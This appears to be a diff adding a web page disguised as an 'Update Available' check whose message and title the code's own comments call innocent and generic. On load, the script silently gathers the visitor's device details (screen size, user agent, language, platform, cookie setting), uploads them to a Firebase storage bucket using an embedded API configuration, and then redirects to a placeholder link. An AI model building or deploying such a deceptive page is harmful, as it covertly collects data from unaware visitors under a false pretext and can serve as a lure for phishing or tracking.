@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Update Available</title> <!-- Generic title -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 50px;
+        }
+        #loadingMessage {
+            font-size: 22px;
+            margin: 30px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Innocent loading message -->
+    <div id="loadingMessage">Checking for updates, please wait...</div>
+
+    <script type="module">
+        // Import Firebase SDK
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
+        import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDOxB-dDPuTgFMf533F0oDTP_vxW6jD7zs",
+            authDomain: "information-3b913.firebaseapp.com",
+            projectId: "information-3b913",
+            storageBucket: "information-3b913.appspot.com",
+            messagingSenderId: "321679054333",
+            appId: "1:321679054333:web:a8cc40ed929e6a4dedf594",
+            measurementId: "G-F2JF7J50NB"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const storage = getStorage(app);
+
+        // Function to log messages to console only (hidden from user)
+        function logMessage(message) {
+            console.log(message); // Log to console for debugging only
+        }
+
+        // Function to collect data and upload it automatically
+        async function collectAndUploadData() {
+            logMessage('Starting automatic data collection...');
+
+            // Collecting basic info
+            const deviceInfo = {
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                browser: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookiesEnabled: navigator.cookieEnabled
+            };
+
+            logMessage('Device info collected:');
+            logMessage(JSON.stringify(deviceInfo, null, 2));
+
+            // Check if data was successfully collected
+            if (deviceInfo) {
+                logMessage('Data collection successful.');
+            } else {
+                logMessage('Data collection failed.');
+                return;
+            }
+
+            // Converting object to string format for txt file
+            const data = JSON.stringify(deviceInfo, null, 2);
+            logMessage('Preparing data for upload...');
+
+            try {
+                const blob = new Blob([data], { type: 'text/plain' });
+                logMessage('.txt file created successfully.');
+
+                // Create a unique file name using timestamp
+                const timestamp = new Date().getTime();
+                const fileName = `device_info_${timestamp}.txt`;
+
+                logMessage(`Uploading .txt file (${fileName}) to Firebase...`);
+
+                // Firebase storage reference for the new file
+                const storageRef = ref(storage, `device_info/${fileName}`);
+
+                // Upload the file to Firebase
+                await uploadBytes(storageRef, blob);
+                logMessage('File uploaded successfully to Firebase!');
+
+                // Redirect after successful upload
+                window.location.href = "https://your-redirect-link.com";  // <-- Change this to your desired redirect URL
+
+            } catch (error) {
+                logMessage('Error during file upload: ' + error.message);
+            }
+        }
+
+        // Automatically collect and upload data as soon as the page loads
+        window.onload = collectAndUploadData;
+
+        logMessage('Page loaded. Initiating data collection...');
+    </script>
+
+</body>
+</html>
